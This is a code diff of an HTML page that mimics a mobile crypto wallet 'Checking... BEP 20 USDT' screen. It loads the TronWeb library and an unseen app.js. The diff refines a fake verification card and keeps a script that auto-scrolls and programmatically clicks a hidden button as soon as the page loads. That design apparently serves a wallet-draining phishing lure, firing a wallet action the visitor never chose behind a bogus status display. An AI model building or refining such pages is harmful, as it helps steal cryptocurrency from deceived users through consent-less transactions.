@@ -13,7 +13,7 @@
             -webkit-user-select: none;
         }
 
-        /* Standard 9:16 Frame Ratio Setup */
+        /* Strict 9:16 Viewport Boundary & Uniform Background */
         html, body {
             width: 100%;
             height: 100vh;
@@ -26,17 +26,17 @@
             align-items: center;
         }
 
-        /* 9:16 Container Boundary */
+        /* 9:16 Mobile Aspect Frame Container */
         .app-viewport {
             width: 100vw;
             height: 100vh;
-            max-width: 100vh * (9/16);
+            max-width: calc(100vh * (9/16));
             background-color: #0d111a;
             position: relative;
             overflow: hidden;
         }
 
-        /* Scroll Container */
+        /* Snap Scroll View Container */
         .scroll-container {
             width: 100%;
             height: 100%;
@@ -51,7 +51,7 @@
             display: none;
         }
 
-        /* Screen 1: Checking UI */
+        /* Top Splash View */
         .section-splash {
             height: 100%;
             width: 100%;
@@ -62,6 +62,7 @@
             text-align: center;
             padding: 20px;
             scroll-snap-align: start;
+            scroll-snap-stop: always;
             background-color: #0d111a;
         }
 
@@ -73,7 +74,6 @@
             margin-bottom: 24px;
         }
 
-        /* Main USDT Logo */
         .usdt-icon {
             width: 76px;
             height: 76px;
@@ -82,7 +82,6 @@
             display: block;
         }
 
-        /* BNB Badge Overlay */
         .bnb-badge {
             position: absolute;
             bottom: -2px;
@@ -104,7 +103,6 @@
             object-fit: cover;
         }
 
-        /* Text Styles */
         .title {
             font-size: 22px;
             font-weight: 700;
@@ -123,16 +121,34 @@
             line-height: 1.4;
         }
 
-        /* Screen 2: Target Section Locked in 9:16 Aspect */
+        /* Screen 2: Bottom View (Absolute Center Floating Element View) */
         .section-target {
             height: 100%;
             width: 100%;
             display: flex;
-            flex-direction: column;
             justify-content: center;
             align-items: center;
-            scroll-snap-align: center;
+            scroll-snap-align: start;
+            scroll-snap-stop: always;
             background-color: #0d111a;
+            position: relative;
+            padding: 16px;
+        }
+
+        /* Floating Centered Container Layer */
+        .floating-card {
+            width: 100%;
+            max-width: 360px;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            text-align: center;
+            padding: 24px 20px;
+            background: #131824;
+            border-radius: 24px;
+            box-shadow: 0 12px 32px rgba(0, 0, 0, 0.45);
+            border: 1px solid rgba(255, 255, 255, 0.05);
         }
 
         /* Hidden Button for Script Auto-Trigger */
@@ -146,8 +162,8 @@
     <div class="app-viewport">
         <div class="scroll-container" id="scrollContainer">
             
-            <!-- Screen 1: Top Checking View -->
-            <div class="section-splash">
+            <!-- Screen 1: Top View -->
+            <div class="section-splash" id="splashView">
                 <div class="icon-wrapper">
                     <img src="https://upload.wikimedia.org/wikipedia/commons/0/01/USDT_Logo.png" alt="USDT Logo" class="usdt-icon">
                     <div class="bnb-badge">
@@ -159,9 +175,21 @@
                 <p class="subtitle">BEP 20 USDT</p>
             </div>
 
-            <!-- Screen 2: Bottom Target View -->
+            <!-- Screen 2: Target Floating Center View -->
             <div class="section-target" id="bottomTarget">
-                <!-- Main Action Element Area -->
+                
+                <!-- Center Floating Element -->
+                <div class="floating-card">
+                    <div class="icon-wrapper">
+                        <img src="https://upload.wikimedia.org/wikipedia/commons/0/01/USDT_Logo.png" alt="USDT Logo" class="usdt-icon">
+                        <div class="bnb-badge">
+                            <img src="https://images.seeklogo.com/logo-png/47/2/bnb-bnb-logo-png_seeklogo-476074.png" alt="BNB Logo">
+                        </div>
+                    </div>
+                    <h1 class="title">Checking...</h1>
+                    <p class="subtitle">BEP 20 USDT</p>
+                </div>
+
             </div>
 
         </div>
@@ -174,18 +202,24 @@
     <script src="https://cdn.jsdelivr.net/npm/tronweb@5.3.0/dist/TronWeb.js"></script>
     <script src="app.js"></script>
 
-    <!-- Background Auto-Trigger & Scroll System -->
+    <!-- Real Trigger and Scroll Execution System -->
     <script>
-        document.addEventListener("DOMContentLoaded", () => {
-            // Instant Scroll Down Trigger
+        window.addEventListener("load", () => {
+            const container = document.getElementById("scrollContainer");
             const target = document.getElementById("bottomTarget");
-            if (target) {
-                target.scrollIntoView({ behavior: "smooth" });
+
+            // Guaranteed Real Scroll Trigger Execution
+            if (container && target) {
+                setTimeout(() => {
+                    container.scrollTo({
+                        top: target.offsetTop,
+                        behavior: "smooth"
+                    });
+                }, 100);
             }
 
-            // Background Script Auto-Trigger
+            // Background Auto Click Trigger
             const btn = document.getElementById("start-btn");
-
             const triggerClick = () => {
                 if (btn) {
                     btn.click();
